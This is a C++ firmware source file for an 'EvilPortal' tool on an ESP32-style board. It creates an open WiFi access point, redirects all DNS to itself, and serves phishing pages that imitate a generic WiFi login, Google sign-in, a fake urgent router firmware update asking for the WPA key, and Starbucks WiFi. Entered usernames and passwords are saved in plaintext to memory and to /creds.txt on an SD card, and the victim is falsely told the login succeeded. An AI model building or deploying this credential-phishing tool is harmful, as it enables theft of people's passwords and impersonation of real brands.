#include "evil_portal.h"
#include "utils.h"
#include "sd_module.h"
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

static DNSServer dnsServer;
static WebServer webServer(80);

// ── Generic Template ─────────────────────────────────────────
const char EvilPortal::PORTAL_HTML_GENERIC[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>WiFi Login</title>
<style>
body{font-family:Arial,sans-serif;background:#f0f2f5;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;padding:25px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.15);width:100%;max-width:340px;text-align:center}
h2{margin-top:0;color:#1a73e8}
p{color:#5f6368;font-size:14px}
input{width:100%;padding:12px;margin:8px 0;box-sizing:border-box;border:1px solid #dadce0;border-radius:4px;font-size:14px}
button{width:100%;background:#1a73e8;color:#fff;border:none;padding:12px;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:10px}
button:hover{background:#1557b0}
</style>
</head>
<body>
<div class="card">
<h2>WiFi Authentication</h2>
<p>Sign in to access high-speed internet.</p>
<form action="/login" method="POST">
<input type="text" name="username" placeholder="Email / Username" required autofocus>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form>
</div>
</body>
</html>
)rawliteral";

// ── Google Account Template ──────────────────────────────────
const char EvilPortal::PORTAL_HTML_GOOGLE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in - Google Accounts</title>
<style>
body{font-family:'Roboto',Arial,sans-serif;background:#fff;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{border:1px solid #dadce0;border-radius:8px;padding:35px 30px;max-width:360px;width:100%;box-sizing:border-box}
.logo{font-size:24px;font-weight:bold;color:#4285F4;margin-bottom:10px;text-align:center}
h1{font-size:22px;margin:0 0 10px;text-align:center;color:#202124}
p{color:#5f6368;font-size:14px;text-align:center;margin-bottom:25px}
input{width:100%;padding:12px 14px;margin:10px 0;border:1px solid #dadce0;border-radius:4px;font-size:15px;box-sizing:border-box}
button{width:100%;background:#1a73e8;color:#fff;border:none;padding:12px;border-radius:4px;font-size:15px;font-weight:500;cursor:pointer;margin-top:15px}
</style>
</head>
<body>
<div class="box">
<div class="logo"><span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span></div>
<h1>Sign in</h1>
<p>Continue with Google Network Access</p>
<form action="/login" method="POST">
<input type="email" name="username" placeholder="Email or phone" required autofocus>
<input type="password" name="password" placeholder="Enter your password" required>
<button type="submit">Next</button>
</form>
</div>
</body>
</html>
)rawliteral";

// ── Router Firmware Upgrade Template ─────────────────────────
const char EvilPortal::PORTAL_HTML_ROUTER[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Router Firmware Upgrade</title>
<style>
body{font-family:sans-serif;background:#2b303a;color:#fff;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#3b404d;padding:25px;border-radius:10px;box-shadow:0 8px 24px rgba(0,0,0,0.4);max-width:380px;width:100%;border-top:4px solid #e74c3c}
h2{margin-top:0;color:#e74c3c}
p{color:#bdc3c7;font-size:13px;line-height:1.4}
input{width:100%;padding:10px;margin:8px 0;border:1px solid #555;border-radius:4px;background:#2b303a;color:#fff;box-sizing:border-box}
button{width:100%;background:#e74c3c;color:#fff;border:none;padding:12px;border-radius:4px;font-size:15px;font-weight:bold;cursor:pointer;margin-top:12px}
</style>
</head>
<body>
<div class="card">
<h2>CRITICAL ROUTER UPDATE</h2>
<p>A critical security patch requires verification of the router WPA/WPA2 pre-shared key or admin credentials to resume internet connectivity.</p>
<form action="/login" method="POST">
<input type="text" name="username" value="admin" placeholder="Admin Username" required>
<input type="password" name="password" placeholder="WiFi / Admin Password" required autofocus>
<button type="submit">Verify & Update Firmware</button>
</form>
</div>
</body>
</html>
)rawliteral";

// ── Starbucks Template ───────────────────────────────────────
const char EvilPortal::PORTAL_HTML_STARBUCKS[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Starbucks WiFi</title>
<style>
body{font-family:Arial,sans-serif;background:#f7f7f7;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;padding:30px;border-radius:6px;max-width:350px;width:100%;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,0.1)}
h2{color:#006241;margin:0 0 10px}
p{color:#666;font-size:13px;margin-bottom:20px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box}
button{width:100%;background:#006241;color:#fff;border:none;padding:12px;border-radius:20px;font-size:15px;font-weight:bold;cursor:pointer;margin-top:10px}
</style>
</head>
<body>
<div class="card">
<h2>Starbucks WiFi</h2>
<p>Welcome! Enter your member email or phone to connect.</p>
<form action="/login" method="POST">
<input type="text" name="username" placeholder="Email Address" required autofocus>
<input type="password" name="password" placeholder="Passcode / Password" required>
<button type="submit">Accept & Connect</button>
</form>
</div>
</body>
</html>
)rawliteral";

EvilPortal::EvilPortal() {
  _running = false;
  _clientCount = 0;
  _credCount = 0;
  _selectedTemplate = PORTAL_TEMPLATE_GENERIC;
  strcpy(_ssid, PORTAL_SSID);
  memset(_creds, 0, sizeof(_creds));
}

void EvilPortal::setTemplate(PortalTemplate t) {
  if (t >= 0 && t < PORTAL_TEMPLATE_COUNT) {
    _selectedTemplate = t;
  }
}

PortalTemplate EvilPortal::getTemplate() const {
  return _selectedTemplate;
}

const char* EvilPortal::getTemplateName(PortalTemplate t) {
  switch (t) {
    case PORTAL_TEMPLATE_GENERIC:   return "Generic";
    case PORTAL_TEMPLATE_GOOGLE:    return "Google";
    case PORTAL_TEMPLATE_ROUTER:    return "Router Update";
    case PORTAL_TEMPLATE_STARBUCKS: return "Starbucks";
    default:                        return "Custom";
  }
}

void EvilPortal::start(const char* ssid) {
  if (ssid && strlen(ssid) > 0) {
    strncpy(_ssid, ssid, 32);
    _ssid[32] = '\0';
  }

  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP(_ssid, nullptr, PORTAL_CHANNEL);

  _setupDNS();
  _setupWebServer();

  _running = true;
  _clientCount = 0;
}

void EvilPortal::stop() {
  if (!_running) return;
  webServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_MODE_STA);
  _running = false;
}

void EvilPortal::_setupDNS() {
  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
}

void EvilPortal::_setupWebServer() {
  webServer.on("/", HTTP_GET, [this]() {
    // Check if custom portal HTML exists on SD card
    if (sdModule.isAvailable()) {
      String sdHtml = sdModule.readFile("/portals/portal.html");
      if (sdHtml.length() > 0) {
        webServer.send(200, "text/html", sdHtml);
        return;
      }
    }

    // Otherwise serve chosen PROGMEM template
    switch (_selectedTemplate) {
      case PORTAL_TEMPLATE_GOOGLE:
        webServer.send_P(200, "text/html", PORTAL_HTML_GOOGLE);
        break;
      case PORTAL_TEMPLATE_ROUTER:
        webServer.send_P(200, "text/html", PORTAL_HTML_ROUTER);
        break;
      case PORTAL_TEMPLATE_STARBUCKS:
        webServer.send_P(200, "text/html", PORTAL_HTML_STARBUCKS);
        break;
      default:
        webServer.send_P(200, "text/html", PORTAL_HTML_GENERIC);
        break;
    }
  });

  webServer.on("/login", HTTP_POST, [this]() {
    String u = webServer.arg("username");
    String p = webServer.arg("password");
    String tName = getTemplateName(_selectedTemplate);

    if (_credCount < MAX_CREDENTIALS) {
      strncpy(_creds[_credCount].username, u.c_str(), 63);
      _creds[_credCount].username[63] = '\0';
      strncpy(_creds[_credCount].password, p.c_str(), 63);
      _creds[_credCount].password[63] = '\0';
      strncpy(_creds[_credCount].timestamp, formatUptime(millis()).c_str(), 11);
      _creds[_credCount].timestamp[11] = '\0';
      strncpy(_creds[_credCount].templateName, tName.c_str(), 15);
      _creds[_credCount].templateName[15] = '\0';
      _credCount++;
    }

    // Save to SD card if available
    if (sdModule.isAvailable()) {
      char credLog[256];
      snprintf(credLog, sizeof(credLog), "[%s] [%s] User: %s | Pass: %s",
               formatUptime(millis()).c_str(), tName.c_str(), u.c_str(), p.c_str());
      sdModule.logData("/creds.txt", credLog);
    }

    String resp = "<html><body style='font-family:sans-serif;text-align:center;padding:50px;'>"
                  "<h2>Connecting...</h2><p>Authentication successful. You are now connected to the internet.</p></body></html>";
    webServer.send(200, "text/html", resp);
  });

  webServer.onNotFound([this]() {
    webServer.sendHeader("Location", "http://192.168.4.1/", true);
    webServer.send(302, "text/plain", "");
  });

  webServer.begin();
}

void EvilPortal::handleClient() {
  if (!_running) return;
  dnsServer.processNextRequest();
  webServer.handleClient();
  _clientCount = WiFi.softAPgetStationNum();
}

bool EvilPortal::isRunning() const { return _running; }
int EvilPortal::getClientCount() const { return _clientCount; }
int EvilPortal::getCredCount() const { return _credCount; }
CapturedCred* EvilPortal::getCred(int index) {
  if (index >= 0 && index < _credCount) return &_creds[index];
  return nullptr;
}
CapturedCred* EvilPortal::getCreds() { return _creds; }
const char* EvilPortal::getSSID() const { return _ssid; }

